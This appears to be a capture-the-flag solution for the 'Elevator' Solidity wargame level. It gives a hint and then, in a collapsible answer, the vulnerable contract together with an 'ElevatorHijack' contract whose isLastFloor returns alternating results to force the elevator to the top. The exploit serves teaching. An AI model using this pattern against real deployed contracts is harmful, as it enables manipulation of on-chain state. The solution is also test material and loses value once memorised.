# Elevator

**HINT:** Look at the interface Building and its function isLastFloor
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.4;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorHijack{
    Elevator elevator;
    bool public switcher = true; 
    
    function setElevator(address _elevator) public{
        elevator = Elevator(_elevator);
    }
    
    function toTheTop() public{
        elevator.goTo(1);
    }
    
    function isLastFloor(uint _level) public returns(bool){
        
        if(switcher){
            switcher = false;
            return false;
        }
        else{
            switcher = true;
            return true;
        }
    }  
}
```
</p>
</details>